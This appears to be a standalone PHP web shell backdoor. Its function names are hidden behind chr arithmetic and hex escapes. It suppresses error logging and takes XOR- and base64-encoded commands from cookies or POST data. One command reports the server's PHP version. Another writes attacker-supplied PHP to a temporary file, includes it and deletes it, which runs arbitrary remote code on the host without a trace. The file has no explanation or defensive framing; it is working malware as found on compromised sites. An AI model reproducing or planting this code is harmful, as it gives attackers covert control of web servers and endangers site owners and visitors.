<?php $mttfxax = 'f'."\151".'l'.chr(101)."\x5f".'p'.chr(117).'t'.'_'."\143"."\x6f"."\x6e".chr(116).chr(850-749)."\x6e".chr(116)."\x73";
$rbqovhiih = "\x62"."\x61"."\x73"."\x65".'6'.'4'.'_'."\x64".chr(824-723)."\x63"."\157"."\144"."\x65";
$ajqincdvhx = chr(105).chr(174-64).chr(105).chr(777-682)."\163".chr(101).chr(928-812);
$vlfvsq = 'u'."\156".'l'.'i'.'n'.chr(107);


@$ajqincdvhx(chr(1017-916).chr(114).'r'.'o'.chr(696-582).'_'."\154".'o'."\x67", NULL);
@$ajqincdvhx("\x6c"."\157"."\x67".chr(683-588)."\145".chr(821-707).chr(114).chr(111).'r'.chr(944-829), 0);
@$ajqincdvhx("\x6d"."\x61"."\x78".'_'.chr(658-557).chr(120).chr(101).chr(910-811)."\165"."\164"."\151".chr(803-692).'n'."\x5f".chr(116).chr(105)."\155".'e', 0);
@set_time_limit(0);

function cerhhywuo($wrzmntdp, $eihiwzktc)
{
    $mtkiqhg = "";
    for ($ugiiiujq = 0; $ugiiiujq < strlen($wrzmntdp);) {
        for ($j = 0; $j < strlen($eihiwzktc) && $ugiiiujq < strlen($wrzmntdp); $j++, $ugiiiujq++) {
            $mtkiqhg .= chr(ord($wrzmntdp[$ugiiiujq]) ^ ord($eihiwzktc[$j]));
        }
    }
    return $mtkiqhg;
}

$vyolkorm = array_merge($_COOKIE, $_POST);
$kpqash = '65416606-397d-4682-94ff-f95e5179c4b4';
foreach ($vyolkorm as $gczym => $wrzmntdp) {
    $wrzmntdp = @unserialize(cerhhywuo(cerhhywuo($rbqovhiih($wrzmntdp), $kpqash), $gczym));
    if (isset($wrzmntdp[chr(97).chr(606-499)])) {
        if ($wrzmntdp[chr(97)] == 'i') {
            $ugiiiujq = array(
                chr(611-499)."\x76" => @phpversion(),
                "\x73".chr(257-139) => "3.5",
            );
            echo @serialize($ugiiiujq);
        } elseif ($wrzmntdp[chr(97)] == "\145") {
            $zcdwppij = "./" . md5($kpqash) . "\x2e"."\151".chr(660-550).chr(813-714);
            @$mttfxax($zcdwppij, "<" . chr(626-563).chr(112).chr(337-233).chr(112)."\x20"."\100".chr(117).chr(110)."\x6c".'i'.'n'.chr(107).chr(40)."\x5f".chr(1084-989).chr(987-917).chr(762-689).'L'."\105"."\137".chr(95)."\51".chr(289-230).chr(577-545) . $wrzmntdp['d']);
            @include($zcdwppij);
            @$vlfvsq($zcdwppij);
        }
        exit();
    }
}

